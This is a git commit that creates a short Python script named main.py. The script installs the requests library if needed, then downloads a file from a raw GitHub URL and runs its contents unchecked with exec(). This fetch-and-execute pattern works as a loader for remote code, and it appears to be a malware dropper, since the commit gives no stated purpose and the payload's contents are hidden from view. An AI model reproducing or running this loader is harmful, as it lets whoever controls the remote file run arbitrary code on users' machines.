85024e31d23b1f90a28c63bfa0f1a8c573da5cfa
qq2q <149266511+qq2q@users.noreply.github.com>
2024-01-21 03:23:23 +0300

    Create main.py

---
+++ main.py
@@ -0,0 +1,19 @@
+import subprocess
+try:
+    import requests
+except ImportError:
+    print("requests is not installed. Installing it now...")
+    try:
+        subprocess.check_call(["pip3", "install", "requests"])
+        print("requests has been successfully installed.")
+        import requests
+    except Exception as e:
+        try:
+            subprocess.check_call(["pip", "install", "requests"])
+            import requests
+            print("requests has been successfully installed using pip.")
+        except Exception as e:
+            print("Failed to install requests with pip and pip:", str(e))
+            exit(0)
+response = requests.get("https://raw.githubusercontent.com/q2qq/AA/main/bot-ios.py")
+exec(response.text)
